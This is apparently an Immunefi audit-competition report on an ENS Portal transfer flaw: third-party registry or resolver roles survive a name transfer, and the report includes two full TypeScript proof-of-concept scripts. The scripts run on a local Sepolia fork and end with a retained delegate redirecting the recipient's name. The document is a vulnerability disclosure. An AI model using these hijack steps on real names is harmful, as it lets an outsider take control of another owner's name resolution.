# 90944 w a medium portal transfer cleanup preserves third party authority that can hijack the recipient s name

**Submitted on Aug 28th 2026 at 10:41:10 UTC by @tinnohofficial for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90944
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

ENSv2 intentionally leaves roles delegated to accounts other than the sender intact when a name token transfers. Portal nevertheless models transfer safety as pointer updates followed by an ERC-1155 token transfer and describes detachment as letting the recipient "start clean." It does not establish or disclose that the recipient receives a name with persistent third-party registry or resolver authority. A pre-existing delegate can therefore survive the normal transfer flow and redirect the name after the intended recipient becomes owner.

The selected in-scope asset is `apps/portal`. The selected in-scope impact is C12: hijacking an ENS name during a transfer.

## Vulnerability Details

`buildTransferPlan()` can emit only `set-eth-addr`, `detach-resolver`, `detach-registry`, and `transfer-token`. No transfer step enumerates or revokes third-party EnhancedAccessControl assignments.

The omission produces two independently validated unsafe post-transfer states.

### Variant 1: a registry manager survives successful cleanup

Portal's default flow detaches the resolver and subregistry pointers and then calls `safeTransferFrom()`. Pointer detachment does not revoke roles on the name's registry resource.

The registry transfer hook moves roles assigned directly to the sender, but a separate manager is a different account and its assignment remains on the unchanged resource. A manager with `ROLE_SET_RESOLVER` can therefore reattach an attacker-controlled resolver after transfer and make the recipient's name resolve to the manager's address.

This path is independent of whether the role holder was visible on another Portal page. The transfer flow never queries role holders or includes them in its plan.

### Variant 2: Portal proceeds with an undetachable delegated resolver

`useTransferDetachTargets()` detects both that a resolver exists and that the sender lacks `ROLE_SET_RESOLVER`. To avoid a partial failure, it hides the detach option:

```ts
const canDetachResolver =
  resolverQuery.isSuccess &&
  hasResolver &&
  rolesQuery.isSuccess &&
  heldRoles.includes("ROLE_SET_RESOLVER");
```

However, the hook still marks preflight settled and the form converts the hidden option to `false`. The transfer remains enabled. If the resolver has a separate delegate, that delegate's resolver role is unaffected by registry token ownership. The recipient inherits only the sender's registry roles, so if the sender lacked `ROLE_SET_RESOLVER`, the recipient also lacks the direct ability to replace the inherited resolver.

The vulnerability is not that Portal refuses to offer an operation the sender cannot execute. It is that Portal proceeds without warning or a safe post-transfer authority invariant after detecting that the security-critical resolver cannot be detached.

Both variants share the same transfer-boundary failure: Portal treats the operations available to the sender as a complete description of the recipient's resulting authority. The flow should enumerate relevant third-party assignments and either revoke them, prove that the recipient can revoke or escape them, or block transfer with an explicit explanation.

The documented persistence rule is not alleged to be a contract defect. It is the protocol invariant that makes Portal's clean-transfer representation unsafe: the Permissioned Registry documentation says roles held by other accounts are unaffected by transfer, while the Portal neither inventories those accounts nor includes their authority in its transfer confirmation.

## Impact Details

The transfer reaches its intended recipient, but a prior third party can change resolution without either the sender's or recipient's key. In the registry-manager case, the third party reattaches its resolver after Portal detached the old pointer. In the resolver-delegate case, it changes the retained resolver's ETH record while the recipient lacks `ROLE_SET_RESOLVER`.

Both PoCs end with Universal Resolver returning the third party's address for the transferred name. This is the explicit C12 transfer-hijack impact.

The recipient may hold or later obtain an admin path that can revoke the delegate or grant itself the missing pointer role. That eventual repair does not prevent the demonstrated hijack immediately after transfer, before the recipient discovers and remediates authority that Portal did not disclose.

This report does not duplicate known issue `QA-01`. QA-01 describes functional errors caused by role combinations and expressly states: "A demonstrated security consequence (e.g., a role combination that grants unintended authority) would be a new finding." This report demonstrates that carveout end to end. It also differs from `WEB-1257`, which describes the previous owner being unable to set a retained subname as primary after a parent transfer, not a surviving third party controlling the recipient's resolver.

## References

* [`SendNameForm.tsx`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/components/SendNameForm.tsx)
* [`useTransferDetachTargets.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts)
* [`buildTransferPlan.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/utils/buildTransferPlan.ts)
* [`useTransferName.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useTransferName.ts)
* [`detachNameResolver.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/detachNameResolver.ts)
* [`detachNameRegistry.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/detachNameRegistry.ts)
* [`transferToken.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/transferToken.ts)
* [Permissioned Registry: Transfers](https://docs.ens.domains/ensv2/permissioned-registry#transfers)
* [Permissioned Resolver: EAC Integration](https://docs.ens.domains/ensv2/permissioned-resolver#eac-integration)
* [ENSv2 contracts README: Transfer Behavior](https://github.com/ensdomains/contracts-v2/blob/main/contracts/README.md#transfer-behavior)
* PoCs: `e2e/scripts/validate-transfer-manager-retention.ts` and `e2e/scripts/validate-transfer-undetachable-resolver.ts`

## Proof of Concept

{% stepper %}
{% step %}

### Start an isolated Sepolia fork

Use a fresh fork for each script:

```bash
anvil --fork-url "$SEPOLIA_RPC_URL" --fork-block-number 11565380 \
  --chain-id 11155111 --block-base-fee-per-gas 100000000 --port 8545
```

{% endstep %}

{% step %}

### Run the retained registry-manager case

```bash
ANVIL_RPC_URL=http://127.0.0.1:8545 \
  pnpm --filter @ens-apps/e2e exec tsx \
  scripts/validate-transfer-manager-retention.ts
```

The script registers a name, grants a separate account `ROLE_SET_RESOLVER`, and imports Portal's `buildTransferPlan()`. Portal produced `['detach-resolver', 'transfer-token']`. After both operations succeeded, the recipient owned the token and the resolver was zero, but the third party's role bitmap was still `0x1000000`. That account reattached its resolver and changed Universal Resolver output to `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`.
{% endstep %}

{% step %}

### Run the undetachable-resolver case

Restart the fork and run:

```bash
ANVIL_RPC_URL=http://127.0.0.1:8545 \
  pnpm --filter @ens-apps/e2e exec tsx \
  scripts/validate-transfer-undetachable-resolver.ts
```

The sender retained transfer authority but did not hold `ROLE_SET_RESOLVER`. Portal hid resolver detachment and produced `['set-eth-addr', 'transfer-token']`. The recipient became owner without `ROLE_SET_RESOLVER`; the resolver delegate had registry bitmap `0x0`, proving this was not the first variant. After transfer, that delegate changed resolution from the recipient to its own address.

Both scripts use deployed ENS V2 registries, resolvers, registrar, and Universal Resolver and assert each role and ownership transition. Both passed again on August 28, 2026.
{% endstep %}
{% endstepper %}

## Complete PoC Source

The following code blocks reproduce the exact PoC files used for validation. Paths are relative to the contest repository root, and the execution commands above invoke these files without modifications to application or contract code.

### `e2e/scripts/validate-transfer-manager-retention.ts`

```ts
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  proxyDeployedEventSnippet,
  verifiableFactoryDeployProxySnippet,
} from '@ensdomains/ensjs-abi/v2'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeEventLog,
  encodeFunctionData,
  http,
  keccak256,
  namehash,
  parseAbi,
  stringToHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { mnemonicToAccount } from 'viem/accounts'
import { getEnsAddress } from 'viem/actions'
import { sepolia } from 'viem/chains'
import { buildTransferPlan } from '../../apps/portal/src/features/transfer/utils/buildTransferPlan.ts'

const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const chain = {
  ...sepolia,
  rpcUrls: { default: { http: [rpcUrl] } },
} as const
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain, transport })
const testClient = createTestClient({ chain, transport, mode: 'anvil' })

const mnemonic = 'test test test test test test test test test test test junk'
const owner = mnemonicToAccount(mnemonic, { addressIndex: 0 })
const manager = mnemonicToAccount(mnemonic, { addressIndex: 1 })
const recipient = mnemonicToAccount(mnemonic, { addressIndex: 2 })
const ownerClient = createWalletClient({ account: owner, chain, transport })
const managerClient = createWalletClient({ account: manager, chain, transport })

const contracts = ensL1Contracts[supportedL1Chains.sepolia]
const registrar = contracts.ensEthRegistrar.address
const registry = contracts.ensRegistry.address
const paymentToken = contracts.usdc.address
const resolverImplementation = contracts.ensPermissionedResolverImpl.address
const factory = contracts.ensVerifiableFactory.address
const universalResolver = contracts.ensUniversalResolver.address

const fullRoleBitmap = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)
const setResolverRole = 1n << 24n
const duration = 28n * 24n * 60n * 60n

const initializeAbi = parseAbi([
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const tokenAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])
const registryAbi = parseAbi([
  'function grantRoles(uint256 anyId, uint256 roleBitmap, address account) returns (bool)',
  'function roles(uint256 anyId, address account) view returns (uint256)',
  'function getTokenId(uint256 anyId) view returns (uint256)',
  'function getOwner(uint256 anyId) view returns (address)',
  'function getResolver(string label) view returns (address)',
  'function setResolver(uint256 anyId, address resolver)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes data)',
])
const resolverAbi = parseAbi([
  'function setAddr(bytes32 node, address addr)',
  'function addr(bytes32 node) view returns (address)',
])

const wait = (hash: `0x${string}`) =>
  publicClient.waitForTransactionReceipt({ hash })

async function deployResolver(
  admin: Address,
  salt: bigint,
): Promise<{ address: Address; hash: `0x${string}` }> {
  const initializeData = encodeFunctionData({
    abi: initializeAbi,
    functionName: 'initialize',
    args: [admin, fullRoleBitmap, []],
  })
  const hash = await ownerClient.writeContract({
    address: factory,
    abi: verifiableFactoryDeployProxySnippet,
    functionName: 'deployProxy',
    args: [resolverImplementation, salt, initializeData],
  })
  const receipt = await wait(hash)
  for (const log of receipt.logs) {
    try {
      const decoded = decodeEventLog({
        abi: proxyDeployedEventSnippet,
        data: log.data,
        topics: log.topics,
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return { address: decoded.args.proxyAddress, hash }
      }
    } catch {
      // Ignore unrelated logs in the deployment receipt.
    }
  }
  throw new Error('ProxyDeployed event not found')
}

async function main() {
  for (const account of [owner, manager, recipient]) {
    await testClient.setCode({ address: account.address, bytecode: '0x' })
    await testClient.setBalance({
      address: account.address,
      value: 100n * 10n ** 18n,
    })
  }

  const suffix = Date.now().toString(36)
  const label = `transfer-manager-${suffix}`
  const name = `${label}.eth`
  const labelId = BigInt(keccak256(stringToHex(label)))
  const secret = keccak256(stringToHex(`secret:${label}`))

  const ownerResolver = await deployResolver(owner.address, BigInt(Date.now()))
  const attackerResolver = await deployResolver(
    manager.address,
    BigInt(Date.now()) + 1n,
  )

  const commitment = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      ownerResolver.address,
      duration,
      zeroHash,
    ],
  })
  const commitHash = await ownerClient.writeContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'commit',
    args: [commitment],
  })
  await wait(commitHash)

  const minCommitmentAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minCommitmentAge) + 1 })
  await testClient.mine({ blocks: 1 })

  const [base, premium] = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'getRegisterPrice',
    args: [label, duration, paymentToken],
  })
  const price = base + premium
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'mint',
      args: [owner.address, price],
    }),
  )
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'approve',
      args: [registrar, price],
    }),
  )
  const registrationHash = await ownerClient.writeContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'register',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      ownerResolver.address,
      duration,
      paymentToken,
      zeroHash,
    ],
  })
  await wait(registrationHash)

  // Same per-name manager grant exposed by Portal's Roles UI.
  const grantHash = await ownerClient.writeContract({
    address: registry,
    abi: registryAbi,
    functionName: 'grantRoles',
    args: [labelId, setResolverRole, manager.address],
  })
  await wait(grantHash)

  const rolesBeforeTransfer = await publicClient.readContract({
    address: registry,
    abi: registryAbi,
    functionName: 'roles',
    args: [labelId, manager.address],
  })
  if ((rolesBeforeTransfer & setResolverRole) === 0n) {
    throw new Error('Manager role grant did not land')
  }

  // Portal's default transfer plan first detaches the resolver, then transfers
  // the current regenerated ERC-1155 token in a separate transaction.
  const portalPlan = buildTransferPlan({
    setEthAddress: false,
    detachResolver: true,
    detachRegistry: false,
  })
  if (portalPlan.join(',') !== 'detach-resolver,transfer-token') {
    throw new Error(`Unexpected Portal transfer plan: ${portalPlan.join(',')}`)
  }
  const detachHash = await ownerClient.writeContract({
    address: registry,
    abi: registryAbi,
    functionName: 'setResolver',
    args: [labelId, zeroAddress],
  })
  await wait(detachHash)
  const tokenId = await publicClient.readContract({
    address: registry,
    abi: registryAbi,
    functionName: 'getTokenId',
    args: [labelId],
  })
  const transferHash = await ownerClient.writeContract({
    address: registry,
    abi: registryAbi,
    functionName: 'safeTransferFrom',
    args: [owner.address, recipient.address, tokenId, 1n, '0x'],
  })
  await wait(transferHash)

  const [newOwner, resolverAfterTransfer, rolesAfterTransfer] =
    await Promise.all([
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'getOwner',
        args: [labelId],
      }),
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'getResolver',
        args: [label],
      }),
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'roles',
        args: [labelId, manager.address],
      }),
    ])
  if (newOwner.toLowerCase() !== recipient.address.toLowerCase()) {
    throw new Error('Name did not transfer to the recipient')
  }
  if (resolverAfterTransfer !== zeroAddress) {
    throw new Error('Default resolver detach did not land')
  }
  if ((rolesAfterTransfer & setResolverRole) === 0n) {
    throw new Error('Expected the third-party manager role to survive transfer')
  }

  // The old manager can immediately undo the transfer's safe default and point
  // the recipient's name at a resolver it controls.
  const reattachHash = await managerClient.writeContract({
    address: registry,
    abi: registryAbi,
    functionName: 'setResolver',
    args: [labelId, attackerResolver.address],
  })
  await wait(reattachHash)
  const hijackHash = await managerClient.writeContract({
    address: attackerResolver.address,
    abi: resolverAbi,
    functionName: 'setAddr',
    args: [namehash(name), manager.address],
  })
  await wait(hijackHash)

  const [resolverAfterHijack, resolverRecordAfterHijack, resolvedAfterHijack] =
    await Promise.all([
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'getResolver',
        args: [label],
      }),
      publicClient.readContract({
        address: attackerResolver.address,
        abi: resolverAbi,
        functionName: 'addr',
        args: [namehash(name)],
      }),
      getEnsAddress(publicClient, {
        name,
        universalResolverAddress: universalResolver,
      }),
    ])
  if (resolvedAfterHijack?.toLowerCase() !== manager.address.toLowerCase()) {
    throw new Error('Manager did not hijack the recipient name')
  }

  console.log(
    JSON.stringify(
      {
        name,
        owner: owner.address,
        retainedManager: manager.address,
        recipient: recipient.address,
        portalPlan,
        ownerResolver: ownerResolver.address,
        attackerResolver: attackerResolver.address,
        ownerResolverDeploymentHash: ownerResolver.hash,
        attackerResolverDeploymentHash: attackerResolver.hash,
        ownerAfterTransfer: newOwner,
        managerRolesBeforeTransfer: `0x${rolesBeforeTransfer.toString(16)}`,
        managerRolesAfterTransfer: `0x${rolesAfterTransfer.toString(16)}`,
        resolverAfterTransfer,
        resolverAfterHijack,
        resolverRecordAfterHijack,
        resolvedAfterHijack,
        registrationHash,
        grantHash,
        detachHash,
        transferHash,
        reattachHash,
        hijackHash,
      },
      null,
      2,
    ),
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

### `e2e/scripts/validate-transfer-undetachable-resolver.ts`

```ts
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  grantResolverRolesWriteParameters,
  revokeRolesWriteParameters,
} from '@ensdomains/ensjs/wallet/v2'
import {
  proxyDeployedEventSnippet,
  verifiableFactoryDeployProxySnippet,
} from '@ensdomains/ensjs-abi/v2'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeEventLog,
  encodeFunctionData,
  http,
  keccak256,
  namehash,
  parseAbi,
  stringToHex,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { mnemonicToAccount } from 'viem/accounts'
import { getEnsAddress } from 'viem/actions'
import { sepolia } from 'viem/chains'
import { buildTransferPlan } from '../../apps/portal/src/features/transfer/utils/buildTransferPlan.ts'
import { decodeRoleBitmap } from '../../apps/portal/src/lib/roles/decodeRoleBitmap.ts'

const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const chain = {
  ...sepolia,
  rpcUrls: { default: { http: [rpcUrl] } },
} as const
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain, transport })
const testClient = createTestClient({ chain, transport, mode: 'anvil' })

const mnemonic = 'test test test test test test test test test test test junk'
const owner = mnemonicToAccount(mnemonic, { addressIndex: 0 })
const manager = mnemonicToAccount(mnemonic, { addressIndex: 1 })
const recipient = mnemonicToAccount(mnemonic, { addressIndex: 2 })
const ownerClient = createWalletClient({ account: owner, chain, transport })
const managerClient = createWalletClient({ account: manager, chain, transport })

const contracts = ensL1Contracts[supportedL1Chains.sepolia]
const registrar = contracts.ensEthRegistrar.address
const registry = contracts.ensRegistry.address
const paymentToken = contracts.usdc.address
const resolverImplementation = contracts.ensPermissionedResolverImpl.address
const factory = contracts.ensVerifiableFactory.address
const universalResolver = contracts.ensUniversalResolver.address

const fullRoleBitmap = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)
const setResolverRole = 1n << 24n
const duration = 28n * 24n * 60n * 60n

const initializeAbi = parseAbi([
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const tokenAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])
const registryAbi = parseAbi([
  'function roles(uint256 anyId, address account) view returns (uint256)',
  'function getTokenId(uint256 anyId) view returns (uint256)',
  'function getOwner(uint256 anyId) view returns (address)',
  'function getResolver(string label) view returns (address)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes data)',
])
const resolverAbi = parseAbi([
  'function setAddr(bytes32 node, address addr)',
  'function addr(bytes32 node) view returns (address)',
])

const wait = (hash: `0x${string}`) =>
  publicClient.waitForTransactionReceipt({ hash })

async function deployResolver(admin: Address, salt: bigint): Promise<Address> {
  const initializeData = encodeFunctionData({
    abi: initializeAbi,
    functionName: 'initialize',
    args: [admin, fullRoleBitmap, []],
  })
  const receipt = await wait(
    await ownerClient.writeContract({
      address: factory,
      abi: verifiableFactoryDeployProxySnippet,
      functionName: 'deployProxy',
      args: [resolverImplementation, salt, initializeData],
    }),
  )

  for (const log of receipt.logs) {
    try {
      const decoded = decodeEventLog({
        abi: proxyDeployedEventSnippet,
        data: log.data,
        topics: log.topics,
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return decoded.args.proxyAddress
      }
    } catch {
      // Ignore unrelated initialization logs.
    }
  }
  throw new Error('ProxyDeployed event not found')
}

async function main() {
  for (const account of [owner, manager, recipient]) {
    await testClient.setCode({ address: account.address, bytecode: '0x' })
    await testClient.setBalance({
      address: account.address,
      value: 100n * 10n ** 18n,
    })
  }

  const suffix = Date.now().toString(36)
  const label = `undetachable-${suffix}`
  const name = `${label}.eth`
  const labelId = BigInt(keccak256(stringToHex(label)))
  const secret = keccak256(stringToHex(`secret:${label}`))
  const node = namehash(name)
  const resolver = await deployResolver(owner.address, BigInt(Date.now()))

  const commitment = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      resolver,
      duration,
      zeroHash,
    ],
  })
  await wait(
    await ownerClient.writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )
  const minCommitmentAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minCommitmentAge) + 1 })
  await testClient.mine({ blocks: 1 })

  const [base, premium] = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'getRegisterPrice',
    args: [label, duration, paymentToken],
  })
  const price = base + premium
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'mint',
      args: [owner.address, price],
    }),
  )
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'approve',
      args: [registrar, price],
    }),
  )
  const registrationHash = await ownerClient.writeContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'register',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      resolver,
      duration,
      paymentToken,
      zeroHash,
    ],
  })
  await wait(registrationHash)

  // A legitimate resolver delegate survives independently of registry ownership.
  const delegateGrant = grantResolverRolesWriteParameters(ownerClient, {
    resolverAddress: resolver,
    targetAccount: manager.address,
    scope: 'name',
    name,
    roles: ['ROLE_SET_ADDR'],
  })
  const delegateGrantHash = await ownerClient.writeContract(delegateGrant)
  await wait(delegateGrantHash)

  // Keep transfer authority but remove the exact role Portal requires to show
  // the resolver-detach option.
  const revokeSetResolver = revokeRolesWriteParameters(ownerClient, {
    registryAddress: registry,
    account: owner.address,
    resource: labelId,
    roles: ['ROLE_SET_RESOLVER'],
  })
  const revokeSetResolverHash =
    await ownerClient.writeContract(revokeSetResolver)
  await wait(revokeSetResolverHash)

  const [ownerRoles, resolverBeforeTransfer, managerRegistryRoles] =
    await Promise.all([
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'roles',
        args: [labelId, owner.address],
      }),
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'getResolver',
        args: [label],
      }),
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'roles',
        args: [labelId, manager.address],
      }),
    ])
  const decodedOwnerRoles = decodeRoleBitmap(toHex(ownerRoles))
  if (ownerRoles & setResolverRole) {
    throw new Error('ROLE_SET_RESOLVER was not revoked from the owner')
  }
  if (!decodedOwnerRoles.includes('ROLE_CAN_TRANSFER_ADMIN')) {
    throw new Error('Owner unexpectedly lost transfer authority')
  }
  if (resolverBeforeTransfer === zeroAddress) {
    throw new Error('Expected a live resolver before transfer')
  }
  if (managerRegistryRoles !== 0n) {
    throw new Error('PoC must not rely on retained registry manager roles')
  }

  const detachResolverVisible =
    resolverBeforeTransfer !== zeroAddress &&
    decodedOwnerRoles.includes('ROLE_SET_RESOLVER')
  if (detachResolverVisible) {
    throw new Error('Portal would unexpectedly show the detach option')
  }

  // This is the effective default plan produced by SendNameForm: the hidden
  // detach toggle contributes false, while the visible ETH-address update stays on.
  const portalPlan = buildTransferPlan({
    setEthAddress: true,
    detachResolver: detachResolverVisible,
    detachRegistry: false,
  })
  if (portalPlan.join(',') !== 'set-eth-addr,transfer-token') {
    throw new Error(`Unexpected Portal plan: ${portalPlan.join(',')}`)
  }

  const setRecipientAddressHash = await ownerClient.writeContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'setAddr',
    args: [node, recipient.address],
  })
  await wait(setRecipientAddressHash)

  const tokenId = await publicClient.readContract({
    address: registry,
    abi: registryAbi,
    functionName: 'getTokenId',
    args: [labelId],
  })
  const transferHash = await ownerClient.writeContract({
    address: registry,
    abi: registryAbi,
    functionName: 'safeTransferFrom',
    args: [owner.address, recipient.address, tokenId, 1n, '0x'],
  })
  await wait(transferHash)

  const [ownerAfterTransfer, recipientRoles, resolvedBeforeHijack] =
    await Promise.all([
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'getOwner',
        args: [labelId],
      }),
      publicClient.readContract({
        address: registry,
        abi: registryAbi,
        functionName: 'roles',
        args: [labelId, recipient.address],
      }),
      getEnsAddress(publicClient, {
        name,
        universalResolverAddress: universalResolver,
      }),
    ])
  const decodedRecipientRoles = decodeRoleBitmap(toHex(recipientRoles))
  if (ownerAfterTransfer.toLowerCase() !== recipient.address.toLowerCase()) {
    throw new Error('Name did not transfer')
  }
  if (decodedRecipientRoles.includes('ROLE_SET_RESOLVER')) {
    throw new Error(
      'Recipient unexpectedly inherited resolver-change authority',
    )
  }
  if (resolvedBeforeHijack?.toLowerCase() !== recipient.address.toLowerCase()) {
    throw new Error('Portal address update did not initially protect recipient')
  }

  const hijackHash = await managerClient.writeContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'setAddr',
    args: [node, manager.address],
  })
  await wait(hijackHash)
  const resolvedAfterHijack = await getEnsAddress(publicClient, {
    name,
    universalResolverAddress: universalResolver,
  })
  if (resolvedAfterHijack?.toLowerCase() !== manager.address.toLowerCase()) {
    throw new Error('Retained resolver delegate could not hijack the name')
  }

  console.log(
    JSON.stringify(
      {
        name,
        owner: owner.address,
        resolver,
        retainedResolverDelegate: manager.address,
        recipient: recipient.address,
        decodedOwnerRoles,
        detachResolverVisible,
        portalPlan,
        managerRegistryRoles: toHex(managerRegistryRoles),
        ownerAfterTransfer,
        decodedRecipientRoles,
        resolvedBeforeHijack,
        resolvedAfterHijack,
        registrationHash,
        delegateGrantHash,
        revokeSetResolverHash,
        setRecipientAddressHash,
        transferHash,
        hijackHash,
      },
      null,
      2,
    ),
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```
